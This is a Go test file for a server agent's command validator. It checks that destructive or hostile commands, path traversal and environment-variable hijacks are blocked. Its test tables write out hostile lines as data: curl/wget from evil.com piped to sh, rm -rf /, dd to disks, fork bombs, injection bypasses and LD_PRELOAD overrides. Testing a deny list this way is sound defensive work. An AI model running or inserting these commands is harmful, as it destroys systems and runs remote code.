package security

import (
	"strings"
	"testing"

	"github.com/codebasehealth/antidote-agent/internal/messages"
)

func TestValidateCommand_DenyPatterns(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name      string
		command   string
		wantError bool
		errorCode string
	}{
		// Default deny patterns
		{"rm -rf /", "rm -rf /", true, "COMMAND_DENIED"},
		{"rm -rf / with spaces", "rm  -rf  /", true, "COMMAND_DENIED"},
		{"rm -rf /*", "rm -rf /*", true, "COMMAND_DENIED"},
		{"rm -rf ~", "rm -rf ~", true, "COMMAND_DENIED"},
		{"rm --no-preserve-root", "rm --no-preserve-root /", true, "COMMAND_DENIED"},
		{"mkfs.ext4", "mkfs.ext4 /dev/sda1", true, "COMMAND_DENIED"},
		{"dd to disk", "dd if=/dev/zero of=/dev/sda", true, "COMMAND_DENIED"},
		{"chmod 777 root", "chmod -R 777 /", true, "COMMAND_DENIED"},
		{"chown root", "chown -R root:root /", true, "COMMAND_DENIED"},
		{"fork bomb", ":(){ :|:& };:", true, "COMMAND_DENIED"},
		{"curl pipe sh", "curl http://evil.com/script.sh | sh", true, "COMMAND_DENIED"},
		{"wget pipe bash", "wget -O- http://evil.com/script.sh | bash", true, "COMMAND_DENIED"},

		// Allowed commands
		{"safe rm", "rm -rf /tmp/test", false, ""},
		{"ls command", "ls -la", false, ""},
		{"git status", "git status", false, ""},
		{"php artisan", "php artisan migrate", false, ""},
		{"npm install", "npm install", false, ""},
		{"docker ps", "docker ps", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test-123",
				Command: tt.command,
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError {
				if err == nil {
					t.Errorf("expected error for command %q, got nil", tt.command)
					return
				}
				if vErr, ok := err.(*ValidationError); ok {
					if vErr.Code != tt.errorCode {
						t.Errorf("expected error code %s, got %s", tt.errorCode, vErr.Code)
					}
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error for command %q: %v", tt.command, err)
				}
			}
		})
	}
}

func TestValidateCommand_AppDenyPatterns(t *testing.T) {
	v := NewValidator()

	// Add an app with custom deny patterns
	apps := []messages.AppInfo{
		{
			Path:      "/var/www/myapp",
			Framework: "laravel",
			Config: &messages.AppConfig{
				App: messages.AppConfigApp{
					Name:      "myapp",
					Framework: "laravel",
				},
				Deny: []string{
					`DROP\s+DATABASE`,
					`TRUNCATE\s+TABLE`,
					`php\s+artisan\s+db:wipe`,
				},
			},
		},
	}

	v.UpdateApps(apps)

	tests := []struct {
		name      string
		command   string
		wantError bool
	}{
		{"DROP DATABASE", "mysql -e 'DROP DATABASE production'", true},
		{"TRUNCATE TABLE", "mysql -e 'TRUNCATE TABLE users'", true},
		{"db:wipe", "php artisan db:wipe", true},
		{"safe migrate", "php artisan migrate", false},
		{"safe query", "mysql -e 'SELECT * FROM users'", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:         "test-123",
				Command:    tt.command,
				WorkingDir: "/var/www/myapp",
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError && err == nil {
				t.Errorf("expected error for command %q, got nil", tt.command)
			}
			if !tt.wantError && err != nil {
				t.Errorf("unexpected error for command %q: %v", tt.command, err)
			}
		})
	}
}

func TestValidateCommand_WorkingDir(t *testing.T) {
	v := NewValidator()

	// Add allowed apps
	apps := []messages.AppInfo{
		{Path: "/var/www/app1", Framework: "laravel"},
		{Path: "/var/www/app2", Framework: "node"},
	}

	v.UpdateApps(apps)

	tests := []struct {
		name       string
		workingDir string
		wantError  bool
		errorCode  string
	}{
		{"allowed path exact", "/var/www/app1", false, ""},
		{"allowed path subdir", "/var/www/app1/storage", false, ""},
		{"allowed path 2", "/var/www/app2", false, ""},
		{"disallowed path", "/etc", true, "INVALID_WORKING_DIR"},
		{"disallowed root", "/", true, "INVALID_WORKING_DIR"},
		{"path traversal", "/var/www/app1/../../../etc", true, "PATH_TRAVERSAL"},
		{"path traversal dots", "/var/www/app1/foo/../../..", true, "PATH_TRAVERSAL"},
		{"empty path (allowed)", "", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:         "test-123",
				Command:    "ls -la",
				WorkingDir: tt.workingDir,
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError {
				if err == nil {
					t.Errorf("expected error for working dir %q, got nil", tt.workingDir)
					return
				}
				if vErr, ok := err.(*ValidationError); ok {
					if vErr.Code != tt.errorCode {
						t.Errorf("expected error code %s, got %s", tt.errorCode, vErr.Code)
					}
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error for working dir %q: %v", tt.workingDir, err)
				}
			}
		})
	}
}

func TestValidateCommand_EnvVars(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name      string
		env       map[string]string
		wantError bool
		errorCode string
	}{
		{"safe env var", map[string]string{"APP_ENV": "production"}, false, ""},
		{"multiple safe vars", map[string]string{"FOO": "bar", "BAZ": "qux"}, false, ""},
		{"protected PATH", map[string]string{"PATH": "/evil/path"}, true, "PROTECTED_ENV_VAR"},
		{"protected LD_PRELOAD", map[string]string{"LD_PRELOAD": "/evil.so"}, true, "PROTECTED_ENV_VAR"},
		{"protected LD_LIBRARY_PATH", map[string]string{"LD_LIBRARY_PATH": "/evil"}, true, "PROTECTED_ENV_VAR"},
		{"protected HOME", map[string]string{"HOME": "/root"}, true, "PROTECTED_ENV_VAR"},
		{"protected IFS", map[string]string{"IFS": " "}, true, "PROTECTED_ENV_VAR"},
		{"null byte in name", map[string]string{"FOO\x00BAR": "value"}, true, "INVALID_ENV_NAME"},
		{"equals in name", map[string]string{"FOO=BAR": "value"}, true, "INVALID_ENV_NAME"},
		{"empty env", map[string]string{}, false, ""},
		{"nil env", nil, false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test-123",
				Command: "echo test",
				Env:     tt.env,
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError {
				if err == nil {
					t.Errorf("expected error, got nil")
					return
				}
				if vErr, ok := err.(*ValidationError); ok {
					if vErr.Code != tt.errorCode {
						t.Errorf("expected error code %s, got %s", tt.errorCode, vErr.Code)
					}
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

func TestValidateCommand_Limits(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name      string
		cmd       *messages.CommandMessage
		wantError bool
		errorCode string
	}{
		{
			name: "command too long",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: strings.Repeat("a", MaxCommandLength+1),
			},
			wantError: true,
			errorCode: "COMMAND_TOO_LONG",
		},
		{
			name: "command at limit",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: strings.Repeat("a", MaxCommandLength),
			},
			wantError: false,
		},
		{
			name: "command ID too long",
			cmd: &messages.CommandMessage{
				ID:      strings.Repeat("x", MaxCommandIDLen+1),
				Command: "ls",
			},
			wantError: true,
			errorCode: "COMMAND_ID_TOO_LONG",
		},
		{
			name: "timeout too long",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Timeout: MaxTimeout + 1,
			},
			wantError: true,
			errorCode: "TIMEOUT_TOO_LONG",
		},
		{
			name: "timeout at limit",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Timeout: MaxTimeout,
			},
			wantError: false,
		},
		{
			name: "env var name too long",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Env:     map[string]string{strings.Repeat("X", MaxEnvVarNameLen+1): "value"},
			},
			wantError: true,
			errorCode: "ENV_NAME_TOO_LONG",
		},
		{
			name: "env var value too long",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Env:     map[string]string{"KEY": strings.Repeat("v", MaxEnvVarValueLen+1)},
			},
			wantError: true,
			errorCode: "ENV_VALUE_TOO_LONG",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateCommand(tt.cmd)

			if tt.wantError {
				if err == nil {
					t.Errorf("expected error, got nil")
					return
				}
				if vErr, ok := err.(*ValidationError); ok {
					if vErr.Code != tt.errorCode {
						t.Errorf("expected error code %s, got %s", tt.errorCode, vErr.Code)
					}
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
			}
		})
	}
}

func TestValidatorUpdateApps(t *testing.T) {
	v := NewValidator()

	// Initially no apps
	if len(v.AllowedPaths()) != 0 {
		t.Error("expected no allowed paths initially")
	}

	// Add apps
	apps := []messages.AppInfo{
		{Path: "/var/www/app1", Framework: "laravel"},
		{Path: "/var/www/app2", Framework: "node"},
	}

	v.UpdateApps(apps)

	paths := v.AllowedPaths()
	if len(paths) != 2 {
		t.Errorf("expected 2 allowed paths, got %d", len(paths))
	}

	// Update with different apps
	newApps := []messages.AppInfo{
		{Path: "/home/deploy/app", Framework: "rails"},
	}

	v.UpdateApps(newApps)

	paths = v.AllowedPaths()
	if len(paths) != 1 {
		t.Errorf("expected 1 allowed path after update, got %d", len(paths))
	}
}

func TestGetAppConfig(t *testing.T) {
	v := NewValidator()

	config := &messages.AppConfig{
		App: messages.AppConfigApp{
			Name:      "testapp",
			Framework: "laravel",
		},
		TrustLevel: "medium",
	}

	apps := []messages.AppInfo{
		{
			Path:      "/var/www/testapp",
			Framework: "laravel",
			Config:    config,
		},
	}

	v.UpdateApps(apps)

	// Exact path
	got := v.GetAppConfig("/var/www/testapp")
	if got == nil || got.App.Name != "testapp" {
		t.Error("expected to find config for exact path")
	}

	// Subpath
	got = v.GetAppConfig("/var/www/testapp/storage/logs")
	if got == nil || got.App.Name != "testapp" {
		t.Error("expected to find config for subpath")
	}

	// Non-existent path
	got = v.GetAppConfig("/var/www/other")
	if got != nil {
		t.Error("expected nil config for non-existent path")
	}
}

// =============================================================================
// COMMAND INJECTION BYPASS TESTS
// =============================================================================

func TestValidateCommand_CommandInjectionBypass(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name      string
		command   string
		wantError bool
		desc      string
	}{
		// Command chaining attempts
		{"semicolon chain", "ls; rm -rf /", true, "command chaining with semicolon"},
		{"and chain", "ls && rm -rf /", true, "command chaining with &&"},
		{"or chain", "ls || rm -rf /", true, "command chaining with ||"},
		{"newline injection", "ls\nrm -rf /", true, "newline to inject second command"},

		// Subshell execution
		{"subshell $()", "echo $(rm -rf /)", true, "command substitution with $()"},
		{"subshell backticks", "echo `rm -rf /`", true, "command substitution with backticks"},
		{"nested subshell", "echo $(echo $(rm -rf /))", true, "nested command substitution"},

		// Encoding tricks
		{"hex encoded rm", "\\x72\\x6d -rf /", false, "hex encoding (shell doesn't interpret)"},
		{"base64 decode pipe", "echo cm0gLXJmIC8= | base64 -d | sh", true, "base64 decode pipe to shell"},

		// Whitespace variations
		{"tab instead of space", "rm\t-rf\t/", true, "using tabs instead of spaces"},
		{"multiple spaces", "rm    -rf    /", true, "multiple spaces between args"},

		// Quote escaping
		{"single quote escape", "rm -rf '/'", true, "rm with quoted root"},
		{"double quote escape", "rm -rf \"/\"", true, "rm with double quoted root"},
		{"mixed quotes", "rm -rf '\"/'\"'", true, "rm with mixed quotes"},

		// Variable expansion
		{"var expansion HOME", "rm -rf $HOME", true, "rm with $HOME expansion"},
		{"var expansion root", "rm -rf ${HOME}/../..", true, "rm with variable and traversal"},

		// Wildcard abuse
		{"glob star", "rm -rf /tmp/../*", true, "globbing with parent traversal"},

		// Background execution
		{"background rm", "rm -rf / &", true, "background execution"},
		{"nohup rm", "nohup rm -rf / &", true, "nohup background execution"},

		// Redirections that could be dangerous
		{"redirect to dev", "echo test > /dev/sda", true, "redirect to block device"},
		{"redirect to passwd", "echo 'root::0:0::/root:/bin/bash' >> /etc/passwd", false, "append to passwd (no default deny)"},

		// Process substitution
		{"process substitution", "cat <(rm -rf /)", true, "process substitution"},

		// Here documents
		{"heredoc injection", "cat << EOF\nrm -rf /\nEOF", true, "heredoc with dangerous command"},

		// Safe commands that look dangerous
		{"safe echo rm", "echo 'rm -rf /'", false, "echoing the string is safe"},
		{"safe grep rm", "grep 'rm -rf' /var/log/auth.log", false, "searching for the string is safe"},
		{"safe comment", "# rm -rf /", false, "commented out command is safe"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test-injection",
				Command: tt.command,
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError && err == nil {
				t.Errorf("SECURITY: %s - expected command to be blocked: %q", tt.desc, tt.command)
			}
			if !tt.wantError && err != nil {
				t.Errorf("false positive for %s: %v", tt.desc, err)
			}
		})
	}
}

func TestValidateCommand_DangerousCommands(t *testing.T) {
	v := NewValidator()

	// These should ALL be blocked
	dangerousCommands := []struct {
		name    string
		command string
	}{
		// Disk destruction
		{"dd to sda", "dd if=/dev/zero of=/dev/sda bs=1M"},
		{"dd to sdb", "dd if=/dev/random of=/dev/sdb"},
		{"dd to nvme", "dd if=/dev/zero of=/dev/nvme0n1"},
		{"shred root", "shred -vfz -n 5 /dev/sda"},
		{"hdparm secure erase", "hdparm --security-erase NULL /dev/sda"},

		// Filesystem destruction
		{"mkfs ext4", "mkfs.ext4 /dev/sda1"},
		{"mkfs xfs", "mkfs.xfs -f /dev/sdb1"},
		{"mkfs btrfs", "mkfs.btrfs /dev/sdc"},

		// Recursive deletion
		{"rm root", "rm -rf /"},
		{"rm root star", "rm -rf /*"},
		{"rm home", "rm -rf ~"},
		{"rm with preserve flag", "rm -rf --no-preserve-root /"},

		// Permission destruction
		{"chmod 777 root", "chmod -R 777 /"},
		{"chmod 000 root", "chmod -R 000 /"},
		{"chown root everything", "chown -R nobody:nobody /"},

		// Fork bomb variants
		{"bash fork bomb", ":(){ :|:& };:"},
		{"function fork bomb", "bomb() { bomb | bomb & }; bomb"},

		// Remote code execution
		{"curl sh", "curl http://evil.com/payload.sh | sh"},
		{"curl bash", "curl -s http://evil.com/payload | bash"},
		{"wget sh", "wget -qO- http://evil.com/payload | sh"},
		{"wget bash", "wget http://evil.com/script -O - | bash"},

		// Python/Perl one-liners
		{"python rm", "python -c 'import os; os.system(\"rm -rf /\")'"},
		{"python3 rm", "python3 -c 'import shutil; shutil.rmtree(\"/\")'"},
		{"perl rm", "perl -e 'system(\"rm -rf /\")'"},

		// Kernel/System attacks
		{"sysrq reboot", "echo b > /proc/sysrq-trigger"},
		{"sysrq crash", "echo c > /proc/sysrq-trigger"},
		{"overwrite kernel", "dd if=/dev/zero of=/boot/vmlinuz"},
	}

	for _, tt := range dangerousCommands {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test-dangerous",
				Command: tt.command,
			}

			err := v.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("CRITICAL SECURITY ISSUE: dangerous command not blocked: %q", tt.command)
			}
		})
	}
}

// =============================================================================
// PATH TRAVERSAL TESTS
// =============================================================================

func TestValidateCommand_PathTraversal(t *testing.T) {
	v := NewValidator()

	apps := []messages.AppInfo{
		{Path: "/var/www/app", Framework: "laravel"},
	}
	v.UpdateApps(apps)

	tests := []struct {
		name       string
		workingDir string
		wantError  bool
		errorCode  string
	}{
		// Basic traversal
		{"simple dotdot", "/var/www/app/../..", true, "PATH_TRAVERSAL"},
		{"multiple dotdot", "/var/www/app/../../../../etc", true, "PATH_TRAVERSAL"},
		{"hidden dotdot", "/var/www/app/storage/../../../etc", true, "PATH_TRAVERSAL"},

		// URL-encoded traversal (if decoded before validation)
		{"dotdot at start", "../../../etc/passwd", true, "PATH_TRAVERSAL"},
		{"dotdot in middle", "/var/www/../../../etc", true, "PATH_TRAVERSAL"},

		// Null byte injection (path truncation attack)
		{"null byte", "/var/www/app\x00/../../etc", true, "PATH_TRAVERSAL"},

		// Double encoding
		{"double dot variations", "/var/www/app/..../", false, ""},       // .... is not traversal
		{"triple dot", "/var/www/app/.../etc", false, ""},                // ... is not traversal
		{"dot space dot", "/var/www/app/. ./", true, "PATH_TRAVERSAL"},   // contains ..

		// Absolute path escapes
		{"absolute etc", "/etc/passwd", true, "INVALID_WORKING_DIR"},
		{"absolute root", "/", true, "INVALID_WORKING_DIR"},
		{"absolute tmp", "/tmp", true, "INVALID_WORKING_DIR"},
		{"absolute proc", "/proc/self/cwd", true, "INVALID_WORKING_DIR"},

		// Valid paths
		{"valid app path", "/var/www/app", false, ""},
		{"valid subdir", "/var/www/app/storage/logs", false, ""},
		{"valid deep path", "/var/www/app/vendor/laravel/framework", false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:         "test-traversal",
				Command:    "ls -la",
				WorkingDir: tt.workingDir,
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError {
				if err == nil {
					t.Errorf("SECURITY: path traversal not blocked: %q", tt.workingDir)
					return
				}
				if vErr, ok := err.(*ValidationError); ok {
					if vErr.Code != tt.errorCode {
						t.Errorf("expected %s, got %s for path %q", tt.errorCode, vErr.Code, tt.workingDir)
					}
				}
			} else {
				if err != nil {
					t.Errorf("false positive for valid path %q: %v", tt.workingDir, err)
				}
			}
		})
	}
}

// =============================================================================
// ENVIRONMENT VARIABLE ATTACK TESTS
// =============================================================================

func TestValidateCommand_EnvVarAttacks(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name      string
		env       map[string]string
		wantError bool
		errorCode string
	}{
		// Library injection attacks
		{"LD_PRELOAD injection", map[string]string{"LD_PRELOAD": "/tmp/evil.so"}, true, "PROTECTED_ENV_VAR"},
		{"LD_LIBRARY_PATH", map[string]string{"LD_LIBRARY_PATH": "/tmp/evil"}, true, "PROTECTED_ENV_VAR"},
		{"DYLD_INSERT_LIBRARIES", map[string]string{"DYLD_INSERT_LIBRARIES": "/tmp/evil.dylib"}, true, "PROTECTED_ENV_VAR"},
		{"DYLD_LIBRARY_PATH", map[string]string{"DYLD_LIBRARY_PATH": "/tmp/evil"}, true, "PROTECTED_ENV_VAR"},

		// PATH manipulation
		{"PATH override", map[string]string{"PATH": "/tmp/evil:/usr/bin"}, true, "PROTECTED_ENV_VAR"},
		{"path lowercase", map[string]string{"path": "/tmp/evil"}, true, "PROTECTED_ENV_VAR"},
		{"Path mixed case", map[string]string{"Path": "/tmp/evil"}, true, "PROTECTED_ENV_VAR"},

		// Shell behavior modification
		{"IFS manipulation", map[string]string{"IFS": "/"}, true, "PROTECTED_ENV_VAR"},
		{"SHELL override", map[string]string{"SHELL": "/tmp/evil"}, true, "PROTECTED_ENV_VAR"},

		// User context manipulation
		{"HOME override", map[string]string{"HOME": "/root"}, true, "PROTECTED_ENV_VAR"},
		{"USER override", map[string]string{"USER": "root"}, true, "PROTECTED_ENV_VAR"},

		// Injection via env var values
		{"command in value", map[string]string{"SAFE": "$(rm -rf /)"}, false, ""},  // Value is just a string
		{"backticks in value", map[string]string{"SAFE": "`whoami`"}, false, ""},   // Value is just a string

		// Null bytes and special chars
		{"null in name", map[string]string{"FOO\x00BAR": "value"}, true, "INVALID_ENV_NAME"},
		{"equals in name", map[string]string{"FOO=BAR": "value"}, true, "INVALID_ENV_NAME"},
		{"newline in name", map[string]string{"FOO\nBAR": "value"}, false, ""},     // newline allowed
		{"null in value", map[string]string{"FOO": "bar\x00baz"}, false, ""},       // value nulls are ok

		// Safe env vars
		{"APP_ENV", map[string]string{"APP_ENV": "production"}, false, ""},
		{"DATABASE_URL", map[string]string{"DATABASE_URL": "mysql://localhost"}, false, ""},
		{"multiple safe", map[string]string{"FOO": "bar", "BAZ": "qux", "APP_DEBUG": "false"}, false, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test-env",
				Command: "echo test",
				Env:     tt.env,
			}

			err := v.ValidateCommand(cmd)

			if tt.wantError {
				if err == nil {
					t.Errorf("SECURITY: env attack not blocked for %s", tt.name)
					return
				}
				if vErr, ok := err.(*ValidationError); ok {
					if vErr.Code != tt.errorCode {
						t.Errorf("expected %s, got %s", tt.errorCode, vErr.Code)
					}
				}
			} else {
				if err != nil {
					t.Errorf("false positive for %s: %v", tt.name, err)
				}
			}
		})
	}
}

// =============================================================================
// EDGE CASES AND BOUNDARY TESTS
// =============================================================================

func TestValidateCommand_EdgeCases(t *testing.T) {
	v := NewValidator()

	tests := []struct {
		name      string
		cmd       *messages.CommandMessage
		wantError bool
	}{
		{
			name: "empty command",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "",
			},
			wantError: false, // Empty command is technically valid
		},
		{
			name: "whitespace only command",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "   \t\n  ",
			},
			wantError: false, // Just whitespace
		},
		{
			name: "very long safe command",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "echo " + strings.Repeat("a", 60000),
			},
			wantError: false, // Long but safe
		},
		{
			name: "unicode command",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "echo 你好世界",
			},
			wantError: false, // Unicode is fine
		},
		{
			name: "emoji command",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "echo 🚀🔥💻",
			},
			wantError: false, // Emoji is fine
		},
		{
			name: "zero timeout",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Timeout: 0,
			},
			wantError: false, // Zero means default
		},
		{
			name: "negative timeout",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Timeout: -1,
			},
			wantError: false, // Negative treated as default
		},
		{
			name: "max int timeout",
			cmd: &messages.CommandMessage{
				ID:      "test",
				Command: "ls",
				Timeout: 2147483647,
			},
			wantError: true, // Way over limit
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := v.ValidateCommand(tt.cmd)

			if tt.wantError && err == nil {
				t.Errorf("expected error for %s", tt.name)
			}
			if !tt.wantError && err != nil {
				t.Errorf("unexpected error for %s: %v", tt.name, err)
			}
		})
	}
}

// =============================================================================
// CONCURRENCY TESTS
// =============================================================================

func TestValidator_Concurrency(t *testing.T) {
	v := NewValidator()

	// Setup some apps
	apps := []messages.AppInfo{
		{Path: "/var/www/app1", Framework: "laravel"},
		{Path: "/var/www/app2", Framework: "node"},
	}
	v.UpdateApps(apps)

	// Run many validations concurrently
	done := make(chan bool, 100)

	for i := 0; i < 100; i++ {
		go func(id int) {
			cmd := &messages.CommandMessage{
				ID:         "test-concurrent",
				Command:    "ls -la",
				WorkingDir: "/var/www/app1",
			}

			// Should not panic or race
			_ = v.ValidateCommand(cmd)
			done <- true
		}(i)
	}

	// Also update apps concurrently
	go func() {
		for i := 0; i < 10; i++ {
			newApps := []messages.AppInfo{
				{Path: "/var/www/newapp", Framework: "rails"},
			}
			v.UpdateApps(newApps)
		}
	}()

	// Wait for all validations
	for i := 0; i < 100; i++ {
		<-done
	}
}

// =============================================================================
// PATTERN COMPILATION TESTS
// =============================================================================

func TestValidator_InvalidPatterns(t *testing.T) {
	v := NewValidator()

	// Add app with invalid regex patterns - should not crash
	apps := []messages.AppInfo{
		{
			Path:      "/var/www/app",
			Framework: "laravel",
			Config: &messages.AppConfig{
				App: messages.AppConfigApp{
					Name:      "app",
					Framework: "laravel",
				},
				Deny: []string{
					"[invalid regex",       // Invalid regex
					"***",                  // Invalid quantifier
					"(?P<name",            // Incomplete named group
					"normal pattern",      // Valid pattern
				},
			},
		},
	}

	// Should not panic
	v.UpdateApps(apps)

	// Valid commands should still work
	cmd := &messages.CommandMessage{
		ID:         "test",
		Command:    "ls -la",
		WorkingDir: "/var/www/app",
	}

	err := v.ValidateCommand(cmd)
	if err != nil {
		t.Errorf("unexpected error after invalid patterns: %v", err)
	}

	// The valid pattern should still match
	cmd.Command = "normal pattern test"
	err = v.ValidateCommand(cmd)
	if err == nil {
		t.Error("expected 'normal pattern' to be blocked")
	}
}

// =============================================================================
// DEFAULT DENY PATTERN COMPLETENESS
// =============================================================================

func TestDefaultDenyPatterns_Completeness(t *testing.T) {
	v := NewValidator()

	// Ensure we have default deny patterns
	if len(DefaultDenyPatterns) == 0 {
		t.Fatal("no default deny patterns configured - this is a security issue")
	}

	// Ensure critical patterns are present
	criticalPatterns := []string{
		"rm -rf /",
		"mkfs",
		"dd.*of=/dev",
		"curl.*|.*sh",
		"wget.*|.*sh",
	}

	// Check that dangerous commands are blocked by defaults
	dangerousTests := []struct {
		command string
		desc    string
	}{
		{"rm -rf /", "recursive delete root"},
		{"rm -rf /*", "recursive delete root contents"},
		{"mkfs.ext4 /dev/sda", "format disk"},
		{"dd if=/dev/zero of=/dev/sda", "overwrite disk"},
		{"curl http://evil.com | sh", "download and execute"},
		{"wget http://evil.com -O - | bash", "download and execute via wget"},
	}

	for _, tt := range dangerousTests {
		t.Run(tt.desc, func(t *testing.T) {
			cmd := &messages.CommandMessage{
				ID:      "test",
				Command: tt.command,
			}

			err := v.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("CRITICAL: default patterns do not block %q", tt.command)
			}
		})
	}

	_ = criticalPatterns // Used for documentation
}
